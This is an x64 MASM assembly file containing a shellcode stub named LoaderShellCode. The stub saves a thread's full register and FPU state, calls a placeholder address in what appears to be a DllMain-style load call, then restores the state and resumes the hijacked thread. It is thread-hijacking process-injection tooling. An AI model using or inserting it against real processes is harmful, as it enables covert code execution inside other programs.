.code

public LoaderShellCode

LoaderShellCode proc
    sub rsp, 8
    mov dword ptr [rsp], 11223344h
    mov dword ptr [rsp + 4], 55667788h

    lea r11, [rsp]

    sub rsp, 4D0h
    and rsp, 0FFFFFFFFFFFFFFF0h

    mov [rsp + 78h], rax
    mov [rsp + 80h], rcx
    mov [rsp + 88h], rdx
    mov [rsp + 90h], rbx
    mov [rsp + 0A0h], rbp
    mov [rsp + 0A8h], rsi
    mov [rsp + 0B0h], rdi
    mov [rsp + 0B8h], r8
    mov [rsp + 0C0h], r9
    mov [rsp + 0C8h], r10
    mov [rsp + 0D0h], r11
    mov [rsp + 0D8h], r12
    mov [rsp + 0E0h], r13
    mov [rsp + 0E8h], r14
    mov [rsp + 0F0h], r15
    mov [rsp + 98h], r11

    mov word ptr [rsp + 38h], cs
    mov word ptr [rsp + 3Ah], ds
    mov word ptr [rsp + 3Ch], es
    mov word ptr [rsp + 3Eh], fs
    mov word ptr [rsp + 40h], gs
    mov word ptr [rsp + 42h], ss

    fxsave dword ptr [rsp + 100h]
    stmxcsr dword ptr [rsp + 34h]

    pushfq
    pop rax
    mov [rsp + 44h], eax
    mov rax, [rsp + 78h]

    mov dword ptr [rsp + 30h], 10000Fh

    sub rsp, 20h                ; Shadow space
    xor rcx, rcx
    mov rdx, 1
    mov r8, 1122334455667788h
    
    mov rax, 1122334455667788h
    call rax
    
    add rsp, 20h

    ldmxcsr dword ptr [rsp + 34h]
    fxrstor dword ptr [rsp + 100h]

    mov eax, [rsp + 44h]
    push rax
    popfq

    mov rax, [rsp + 78h]
    mov rcx, [rsp + 80h]
    mov rdx, [rsp + 88h]
    mov rbx, [rsp + 90h]
    mov rbp, [rsp + 0A0h]
    mov rsi, [rsp + 0A8h]
    mov rdi, [rsp + 0B0h]
    mov r8,  [rsp + 0B8h]
    mov r9,  [rsp + 0C0h]
    mov r10, [rsp + 0C8h]
    mov r11, [rsp + 0D0h]
    mov r12, [rsp + 0D8h]
    mov r13, [rsp + 0E0h]
    mov r14, [rsp + 0E8h]
    mov r15, [rsp + 0F0h]

    mov rsp, [rsp + 98h]

    ret
LoaderShellCode endp

end
